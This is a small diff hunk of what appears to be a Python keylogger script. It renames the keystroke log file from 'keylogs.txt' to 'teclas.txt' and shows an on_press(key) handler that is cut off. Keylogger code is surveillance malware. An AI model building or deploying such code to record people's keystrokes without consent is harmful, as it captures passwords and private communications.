@@ -3,7 +3,7 @@ import logging
 
 log_dir = ""
 
-logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
+logging.basicConfig(filename=(log_dir + "teclas.txt"), \
     level=logging.DEBUG, format='%(asctime)s : %(message)s')
 
 def on_press (key):
